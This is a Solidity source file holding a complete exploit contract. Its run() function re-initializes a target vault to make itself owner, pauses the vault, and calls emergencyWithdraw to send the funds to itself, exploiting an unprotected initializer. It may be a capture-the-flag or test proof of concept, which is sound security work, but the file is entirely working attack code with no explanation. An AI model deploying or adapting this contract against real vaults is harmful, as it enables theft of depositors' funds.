// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IInitVault {
    function initialize(address owner_, uint256 withdrawLimit_) external;
    function setPaused(bool paused_) external;
    function emergencyWithdraw(address payable to) external;
}

contract Exploit {
    IInitVault public vault;

    constructor(address target) payable {
        vault = IInitVault(target);
    }

    function run() external {
        vault.initialize(address(this), 5 ether);
        vault.setPaused(true);
        vault.emergencyWithdraw(payable(address(this)));
    }

    receive() external payable {}
}
